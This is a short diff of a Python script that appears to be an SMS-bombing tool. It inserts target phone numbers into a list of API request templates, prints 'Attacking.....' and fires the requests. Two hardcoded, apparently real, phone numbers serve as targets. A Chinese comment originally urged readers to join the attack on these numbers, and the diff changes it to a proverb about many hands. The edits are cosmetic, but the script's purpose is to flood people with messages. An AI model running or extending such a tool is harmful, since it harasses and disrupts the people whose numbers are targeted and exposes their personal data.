@@ -205,7 +205,7 @@ def replacePhone(phone):
         api_str = json.dumps(api)
         api_str = api_str.replace("target_Phone", phone)
         target_list.append(json.loads(api_str))
-        print("Attacking....."+phone)
+    print("Attacking....."+phone)    
     return target_list
 
 
@@ -227,6 +227,7 @@ def default(jiekou, headers):
     print(resp.status_code)
     print(resp.text)
     print(resp.url)
+    print("--------------")
 
 
 def caseSpecial(jiekou, special):
@@ -255,7 +256,7 @@ def run(jiekou_list):
 
 
 if __name__ == '__main__':
-    #请带上这几个目标一起攻击，人多力量大
+    #众人拾柴火焰高
     phone = ["13672978489","18898381999"]
     for p in phone:
         target_list = replacePhone(p)
